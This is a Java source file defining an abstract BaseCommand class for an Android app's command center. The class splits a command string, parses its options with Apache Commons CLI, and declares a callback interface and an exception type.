package com.theah64.frenemy.android.commandcenter.commands;

import android.content.Context;

import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;

/**
 * Created by theapache64 on 14/9/16,7:48 PM.
 */
public abstract class BaseCommand {

    private final String[] args;
    private CommandLine cmd;

    BaseCommand(String command) throws CommandException, ParseException {
        if (command != null && !command.isEmpty()) {
            this.args = command.split(" ");
            if (getOptions() != null && args.length <= 2) {
                throw new CommandException("Command should have at least 2 parts");
            } else {
                //Valid command syntax, check for options
                if (getOptions() != null) {
                    final CommandLineParser parser = new DefaultParser();
                    this.cmd = parser.parse(getOptions(), args);
                }
            }

        } else {
            throw new CommandException("Command can't empty!");
        }
    }

    public String getCommandType() {
        return args[1];
    }

    CommandLine getCmd() {
        return cmd;
    }

    public abstract void handle(final Context context, final Callback callback);

    public abstract Options getOptions();

    public interface Callback {
        void onError(final String message);

        void onInfo(final String message);

        void onSuccess(final String message);

        void onFinish(final String message);

    }

    public static class CommandException extends Exception {
        public CommandException(String s) {
            super(s);
        }
    }

}
